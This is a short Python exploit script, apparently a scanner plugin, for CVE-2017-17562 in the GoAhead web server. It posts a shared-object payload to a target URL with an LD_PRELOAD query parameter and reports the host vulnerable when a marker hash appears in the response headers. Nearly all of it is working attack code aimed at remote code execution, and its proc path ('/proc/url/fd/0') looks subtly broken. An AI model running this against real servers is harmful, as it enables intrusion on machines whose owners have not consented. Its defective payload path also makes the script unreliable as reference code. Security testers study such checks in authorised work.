#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: GoAhead LD_PRELOAD远程代码执行(CVE-2017-17562)
referer: http://www.freebuf.com/articles/web/157673.html
author: Lucifer
description: 该漏洞源于使用不受信任的HTTP请求参数初始化CGI脚本环境，
            并且会影响所有启用了动态链接可执行文件（CGI脚本）支持的用户。
            当与glibc动态链接器结合使用时，使用特殊变量（如LD_PRELOAD）可以滥用该漏洞，从而导致远程代码执行。
'''
import os
import sys
import requests
import warnings
def run(url):
        result = ['GoAhead LD_PRELOAD远程代码执行(CVE-2017-17562)', '', '']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "?LD_PRELOAD=/proc/url/fd/0"
        vulnurl = url + payload
        try:
            path = os.getcwd() + "/bin/goahead_payload.so"
            data = open(path, 'rb')
            req = requests.post(vulnurl, data=data, headers=headers, timeout=10, verify=False)
            if r"098f6bcd4621d373cade4e832627b4f6" in str(req.headers):
                result[2] = '存在'
                result[1]=vulnurl
            else:
                result[2] = '不存在'

        except:
            result[2] = '不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    